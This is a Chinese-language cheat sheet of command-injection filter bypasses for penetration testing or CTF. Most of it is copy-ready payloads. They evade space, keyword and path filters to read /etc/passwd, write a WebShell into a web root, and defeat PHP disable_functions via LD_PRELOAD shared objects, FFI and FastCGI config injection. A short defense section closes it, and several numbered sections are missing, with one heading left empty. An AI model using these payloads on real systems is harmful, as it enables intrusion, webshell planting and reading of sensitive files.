## 一、概述与绕过思路

命令执行（RCE / Command Injection）场景下，防御方通常会从以下维度做过滤：

| 防御层 | 常见过滤对象 | 典型绕过方向 |
|--------|--------------|--------------|
| 字符层 | 空格、`;` `\|` `&` `$` `` ` `` `>` `<` | `${IFS}`、`{a,b}`、编码、重定向 |
| 关键字层 | `cat` `ls` `flag` `bash` `sh` | 替代命令、字符插入、通配符、变量拼接 |
| 路径层 | `/bin/` `/etc/` 绝对路径 | 通配符 `/???/??t`、`$PATH` 截取 |
| 长度层 | 单次输入长度限制 | 分块写入、远程加载、文件落地 |
| 函数层 | `system` `exec` 等（PHP） | LD_PRELOAD、FFI、FastCGI |
| 进程层 | 受限 Shell (rbash) | 编辑器逃逸、PATH 劫持 |
| 主机层 | AMSI、Defender、EDR | AMSI Patch、内存加载、混淆 |

**核心思路**：找到过滤逻辑的盲区（编码层、解析层、字符集差异、子进程、协议层），让"被过滤的形式"和"实际执行的语义"分离。

## 二、空格绕过

### 2.1 `${IFS}` —— 内部字段分隔符

`IFS`（Internal Field Separator）默认包含空格、Tab、换行。引用它等价于引用一个空白字符。

```bash
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat$IFS$9/etc/passwd          # $9 是第 9 个位置参数，恒为空，用于截断
cat${IFS}${IFS}/etc/passwd    # 多次拼接
```

### 2.2 重定向符代替空格

```bash
cat</etc/passwd               # < 替代空格
cat<>/etc/passwd              # <> 读写方式打开
```

### 2.3 花括号

```bash
{cat,/etc/passwd}             # Bash brace expansion
{ls,-la}
```

### 2.4 Tab / 换行符

```bash
cat\t/etc/passwd              # 真实 Tab，等价于空格
echo%09hello                  # URL 编码 Tab（PHP/Apache 场景）
echo%0ahello                  # URL 编码换行
```

### 2.5 环境变量构造空格

```bash
X=$'\x20';cat${X}/etc/passwd
```

## 三、关键字黑名单绕过（cat / ls / flag 等）

### 3.1 替代命令（最实用）

| 被过滤 | 替代方案 |
|--------|----------|
| `cat` | `tac` `nl` `more` `less` `head` `tail` `od` `xxd` `base64` `sort` `rev` `paste` `grep .` `awk '1'` `sed -n '1,$p'` |
| `ls` | `dir` `find .` `echo *` `printf '%s\n' *` `vdir` |
| `bash` | `sh` `dash` `zsh` `csh` `ksh` |
| `curl` / `wget` | `python -c "import urllib;..."`、`nc`、`/dev/tcp` |
| `id` | `whoami` `/usr/bin/id` `echo $UID` |
| `ifconfig` | `ip a` `ip addr` |

### 3.2 字符插入（引号、反斜杠）

```bash
c'a't /etc/passwd             # 单引号
c"a"t /etc/passwd             # 双引号
c\a\t /etc/passwd             # 反斜杠转义
''cat /etc/passwd             # 前置空字符串
ca""t /etc/passwd
```

### 3.3 变量拼接

```bash
a=ca;b=t;$a$b /etc/passwd     # 拼出 cat
c=fl;d=ag;$c$d.txt            # 拼出 flag
```

### 3.4 `$@` / `${x]}` 占位

```bash
ca$@t /etc/passwd             # $@ 在无参数时为空
ca${x}t /etc/passwd           # 未定义变量为空
```

### 3.5 Base64 / Hex 反编码后执行

```bash
echo Y2F0 | base64 -d | sh    # 解出 cat（但 cat 是关键字时，可换成整条命令编码）
```

### 3.6 反转字符串

```bash
echo 'col' | rev              # loc
$(echo L2V0Yy9wYXNzd2Q= | base64 -d)   # 内联解码后执行
```

## 四、命令连接符绕过

### 4.1 Linux

| 符号 | 含义 | 示例 |
|------|------|------|
| `;` | 顺序执行 | `cmd1;cmd2` |
| `&&` | 短路与（前成功才执行后） | `cmd1 && cmd2` |
| `\|\|` | 短路或（前失败才执行后） | `cmd1 \|\| cmd2` |
| `\|` | 管道 | `cmd1 \| cmd2` |
| `&` | 后台执行 + 链接 | `cmd1 & cmd2` |
| `%0a` | 换行（URL） | `cmd1%0acmd2` |
| `%0d%0a` | CRLF | `cmd1%0d%0acmd2` |

### 4.2 Windows

| 符号 | 含义 |
|------|------|
| `&` | 顺序执行 |
| `&&` | 短路与 |
| `\|` | 管道 |
| `\|\|` | 短路或 |

## 五、花括号扩展（Brace Expansion）

### 5.1 原理

Bash 在词法分析阶段对 `{a,b,c}` 做展开，可绕过基于空格的关键字匹配。

```bash
{echo,payload}                # 等价 echo payload
{echo,payload}|{base64,-d}    # 等价 echo payload | base64 -d
{ls,-la,/tmp}
```

### 5.2 写 WebShell

```bash
/bin/bash -c '{echo,cGF5bG9hZA==}|{base64,-d}'>/var/www/html/1.jsp
```

### 5.3 拆分关键字

```bash
{ec,ho}{o,}                   # 错乱拼接（慎用，结果不可预期）
{c,at} /etc/passwd            # 拼出 cat（注意会生成两个词：cat at）
```

### 5.4 范围展开

```bash
echo {a..z}                   # 输出 a b c ... z
echo file{1..5}.txt           # file1.txt file2.txt ...
```

## 六、通配符绕过（Wildcards / Globbing）

### 6.1 基础通配

```bash
/???/??t  /etc/passwd         # 匹配 /bin/cat
/b?n/b?sh                     # 匹配 /bin/bash
/[b]in/[c]at /etc/passwd      # 字符类
/?[a-z]?/??e64 -d             # 匹配 /usr/bin/base64
```

### 6.2 与花括号组合

```bash
/???/??sh -c '{echo,cGF5bG9hZA==}|{base64,-d}'>/tmp/x
```

### 6.3 利用 `*` 模糊匹配

```bash
/bin/c* /etc/passwd           # 匹配 /bin/cat
/usr/bin/bas*                 # 匹配 bash
/v*r/www/html/*               # 路径通配
```

### 6.4 字符类 `[ ]`

```bash
/bin/[cb]at                   # 匹配 cat 或 bat
/etc/p[a]sswd                 # 匹配 /etc/passwd
```

## 七、变量拼接与参数截取

### 7.1 从环境变量取字符

```bash
x=${PATH:0:1}                 # x = "/"（PATH 首字符）
${x}bin${x}bash -c 'id'

p=${PWD:0:1}                  # 当前目录首字符（通常为 /）
${p}bin${p}sh

h=${HOME:0:1}                 # 同上
```

### 7.2 拼接命令

```bash
a=ec;b=ho;$a$b payload        # echo payload
c=ba;d=sh;$c$c -c 'id'        # bash
```

### 7.3 变量替换

```bash
${PATH/bin/BIN}               # 替换字符
${#PATH}                      # 取长度
${PATH: -1}                   # 取最后字符
```

### 7.4 字典攻击思路

通过 `${PATH}` `${PWD}` `${HOME}` `${SHELL}` 拼出任意字符，常用于：
- 没有字母数字可用的极端场景（如 `<?php $_=[]; $_=@"$_"; ...`）
- CTF 中的"无字母数字 RCE"

## 八、内联执行（Inline Execution）

### 8.1 `$()` 与反引号

```bash
echo $(whoami)                # 命令替换
echo `whoami`                 # 旧式写法

cat $(which flag.txt)         # 内联取路径
```

### 8.2 利用内联做编码绕过

```bash
$(printf "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")   # /etc/passwd
echo $(echo L2V0Yy9wYXNzd2Q= | base64 -d)                   # 内联 base64 解码

# 间接执行
a=L2V0Yy9wYXNzd2Q=;cat $(echo $a | base64 -d)
```

### 8.3 嵌套与组合

```bash
$(cat /tmp/cmd)               # 从文件读取命令再执行
`$(echo $cmd)`                # 嵌套
```

## 十四、纯 sh 兼容写法

## 十八、PHP disable_functions 绕过

### 18.1 常见绕过方法总览

| 方法 | 前提条件 | 备注 |
|------|----------|------|
| **常规绕过** | 寻找未禁用的函数（`pcntl_exec`、`mail`、`error_log`） | 优先尝试 |
| **LD_PRELOAD** | `putenv` 可用 + 能上传 `.so` + `mail()`/`error_log()` 触发子进程 | 最经典 |
| **PHP-FPM/FastCGI** | 知道 FPM 监听地址（`127.0.0.1:9000` 或 Unix socket） | 通过 `PHP_VALUE` 覆盖配置 |
| **FFI** | PHP ≥ 7.4 + `ffi.enable=true` | `FFI::cdef()` 直接调 C 函数 |
| **Windows COM** | Windows + `com.allow_dcom=true` | `WScript.Shell` |
| **ImageMagick** | Imagick 扩展 + CVE | 利用 SVG/MSL 触发 |
| **imap_open** | PHP < 7.2.4 + imap 扩展 | options 参数注入 |
| **GCONV_PATH** | 可设置环境变量 + 上传 `gconv-modules` | 字符集加载劫持 |
| **UAF 漏洞** | PHP 7.0-7.4 特定版本 | 利用垃圾回收 UAF |

### 18.2 LD_PRELOAD 利用范式

```php
<?php
// 1. 上传恶意 .so
// 2. putenv 设置 LD_PRELOAD
// 3. mail() 触发 sendmail 子进程，子进程加载 .so

putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@b.com", "x", "y");
?>
```

evil.c：
```c
#include <stdlib.h>
#include <string.h>
__attribute__((constructor)) void lpe() {
    unsetenv("LD_PRELOAD");
    system("id > /tmp/out");
}
```

### 18.3 PHP-FPM 覆盖配置

通过构造 FastCGI 数据包，向 FPM 注入 `PHP_VALUE`：
```
PHP_VALUE = disable_functions=
PHP_VALUE = open_basedir=/
PHP_ADMIN_VALUE = auto_prepend_file=php://input
```

### 18.4 FFI 利用

```php
<?php
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system("id > /tmp/x");
?>
```

## 二十、检测与防御建议

| 检测/防御方式 | 绕过难点 |
|--------------|----------|
| 正则匹配 `echo.*\|.*base64` | 花括号 / 变量拼接 / 十六进制 |
| 路径白名单（如只允许 `/bin/sh`） | 通配符 `/???/??sh` |
| 命令长度限制 | 分块写入 / 远程加载 |
| 特殊字符黑名单（`\|` `>` `$`） | 编码 / 重定向替代 |
| 内容特征检测（WebShell 签名） | 多层编码 / 分段解码 |
| 关键字黑名单 | 替代命令 / 字符插入 / 通配符 |
| PHP `disable_functions` | LD_PRELOAD / FFI / FastCGI |
| AMSI（Windows） | AMSI Patch / 内存加载 / .NET 反射 |

### 纵深防御建议

1. **避免直接执行外部命令**：用语言原生库替代 `system`/`exec`。
2. **白名单而非黑名单**：对输入做严格类型校验。
3. **最小权限**：Web 进程降权、chroot jail、AppArmor/SELinux。
4. **命令层防护**：`/bin/rbash`、禁用 `bash --restricted`、过滤 PATH。
5. **日志与监控**：审计 `execve` 系统调用（Auditd / Sysmon）。
6. **WAF 规则**：覆盖编码、通配符、变量拼接组合，避免单点正则。
7. **EDR / AMSI**：开启 ScriptBlock Logging、Constrained Language Mode。
8. **`disable_functions` 兜底**：禁用 `system/exec/passthru/shell_exec/popen/proc_open/pcntl_exec/mail/putenv`，并配合 `open_basedir`。
